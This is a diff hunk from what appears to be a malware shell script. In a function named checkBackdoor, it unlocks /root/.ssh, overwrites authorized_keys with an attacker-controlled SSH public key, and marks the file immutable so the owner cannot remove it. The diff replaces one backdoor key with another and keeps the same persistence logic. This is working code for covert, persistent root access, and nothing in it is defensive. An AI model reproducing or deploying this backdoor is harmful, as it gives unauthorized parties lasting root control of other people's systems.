@@ -102,9 +102,9 @@ checkBackdoor(){
         else
                 $busybox chattr -aiR /root/.ssh/
         fi
-        if ! $busybox grep -q "paDKiUwmHNUSW7E1S18Cl" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]
+        if ! $busybox grep -q "crbv0ds3/3MgVNHfXHGcCw" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]
         then
-                $busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAv54nAGwGwm626zrsUeI0bnVYgjgS/ux7V5phklbZYFHEm+3Aa0gfu5EQyQdnhTpo1adaKxWJ97mrM5a2VAfTN+n6KUwNYRZpaDKiUwmHNUSW7E1S18ClTCBtRsC0rRDTnIrslTRSHlM3cNN+MskKTW/vWz/oE3ll4MMQqexZlsLvMpVVlGq6t3XjFXz0ABBI8GJ0RaBS81FS2R1DNSCb+zORNb6SP6g9hHk1i9V5PjWNqNGXyzWIrCxLc88dGaTttUYEoxCl4z9YOiTw8F5S4svbcqTTVIu/zt/7OIQixDREGbddAaXZXidu+ijFeeOul/lJXEXQK8eR1DX1k2VL+w== rsa 2048-040119" > /root/.ssh/authorized_keys
+                $busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV0zreCpf9ddN6w3XvbnwJRxzav3A0nGCX+tAjanb5BRDD1pLJXabRJxF28Lf7MtcvbF/vripTwM62FjfODIDuqrBKv2crbv0ds3/3MgVNHfXHGcCw6x5ezV0+kfyY0OBlVJv7iP9Q78mM38/Nfz/gGN5vYtsR3zVZrk23spXRFhuPbE8P6PHTAyXC99wi/cISBnV1130hz7/wi1M55PaXXHn+et3CPmao4yAV5zI2tatird5zMETIYK2n8VmkOUtIMlNDZC8wUhv/RB+Lgk81uPc3HCI/r8hulMAYyp8Bj2eHN1DDTWOpLqohnI45NGeReR2JIA/6l2lJNbQ+IRCn rsa 2048-040119" > /root/.ssh/authorized_keys
                 $busybox chattr +ai /root/.ssh/authorized_keys
         fi
         if [[ `$busybox lsattr /root/.ssh/authorized_keys|$busybox awk '{print $1}'|$busybox grep i|$busybox grep -v grep|$busybox wc -l` != 1 ]]
